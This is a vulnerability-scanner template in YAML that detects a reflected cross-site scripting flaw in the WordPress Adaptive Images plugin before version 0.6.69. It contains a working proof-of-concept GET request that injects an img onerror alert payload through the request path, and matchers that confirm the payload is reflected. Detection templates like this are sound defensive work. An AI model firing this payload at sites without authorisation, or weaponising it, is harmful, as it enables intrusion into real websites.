id: wp-adaptive-xss
name: WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting
severity: high
confidence: tentative
description: WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize
  and escape the REQUEST_URI before outputting it back in a page.
reference: CWE-79
tags:
- wpscan
- wordpress
- xss
- wp-plugin
- wp
- vuln
requests:
- method: GET
  path: /wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true
  matchers:
  - type: body
    words:
    - <img/src/onerror=alert(document.domain)>
    - <td>Image</td>
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
